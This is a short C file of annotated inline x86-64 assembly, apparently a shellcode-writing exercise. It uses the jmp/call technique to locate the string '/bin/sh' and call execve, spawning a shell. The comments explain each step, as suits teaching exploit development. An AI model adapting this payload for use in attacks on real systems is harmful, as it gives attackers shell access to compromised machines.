int main(int argc, char **argv)
{
	__asm__("lea 0x20(%rip),%rax");         /* load 'call' block address
	                                           to $rax. Note: $rip is
	                                           that of the next op       */
	__asm__("jmp *%rax");                   /* jmp to 'call' block       */
	__asm__("movq $0x0,0x8(%rsp)");         /* terminate execve's argv
	                                           array with a NULL         */
	__asm__("mov 0x0(%rsp),%rdi");          /* set string address as
	                                           execve's 1st param        */
	__asm__("mov %rsp,%rsi");               /* set argv array address as
	                                           execve's 2nd param        */
	__asm__("mov $0x0,%rdx");          	/* set NULL for execve's 3rd
	                                           parameter */
	__asm__("mov $0x3b,%eax");              /* set 0x3b - execve's
	                                           system call id in $eax    */
	__asm__("syscall");                     /* execute the system call   */
	__asm__("lea -0x25(%rip),%rax");        /* prepare to call back to
	                                           after the jmp instruction */
	__asm__("callq *%rax");                 /* call back to after the
	                                           jmp instruction           */
	__asm__(".string \"/bin/sh\"");         /* execution string for
	                                           execve                    */
	return 0;
}

